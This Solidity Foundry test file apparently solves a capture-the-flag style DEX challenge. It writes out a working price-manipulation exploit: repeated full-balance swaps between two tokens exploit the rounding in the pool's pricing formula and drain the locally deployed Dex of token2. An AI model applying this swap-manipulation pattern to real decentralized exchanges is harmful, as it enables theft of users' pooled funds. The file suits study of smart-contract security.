// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/Contract.sol";

contract Victim {
    function getSwapPrice(uint256 bal1, uint256 bal2, uint256 amount) public view returns(uint){
        return (amount * bal1)/bal2;
    }
}

contract ExploitTest is Test {

    DexAttacker public attacker;
    SwappableToken token1;
    SwappableToken token2;
    Dex public dex;
    address public eoaAddress;

    function setUp() public {
        eoaAddress = 0x15cB768EBC5A5E7524fdDc3A2d5db7512767bD53;
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "tok1", "T1", 110);
        token2 = new SwappableToken(address(dex), "tok2", "T2", 110);
        dex.setTokens(address(token1), address(token2));
        token1.transfer(eoaAddress, 10);
        token2.transfer(eoaAddress, 10);
        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);
    }

    function testExploit() public {
        vm.prank(eoaAddress);
        token1.transfer(address(dex), 10);

        for (uint i = 0; i < 11; i++) {
            if (i % 2 == 0) {
                uint orig = token2.balanceOf(eoaAddress);
                vm.prank(eoaAddress);
                token2.approve(address(dex), orig);
                vm.prank(eoaAddress);
                dex.swap(address(token2), address(token1), orig);
            }
            else {
                uint orig = token1.balanceOf(eoaAddress);
                vm.prank(eoaAddress);
                token1.approve(address(dex), orig);
                vm.prank(eoaAddress);
                dex.swap(address(token1), address(token2), orig);
            }            
        }
        assertEq(token1.balanceOf(eoaAddress), 76);
        vm.prank(eoaAddress);
        token1.approve(address(dex), 76);
        vm.prank(eoaAddress);
        assertEq(dex.getSwapPrice(address(token1), address(token2), 34), 110);
        vm.prank(eoaAddress);
        dex.swap(address(token1), address(token2), 34);
        assertEq(token2.balanceOf(address(dex)), 0);
    }
}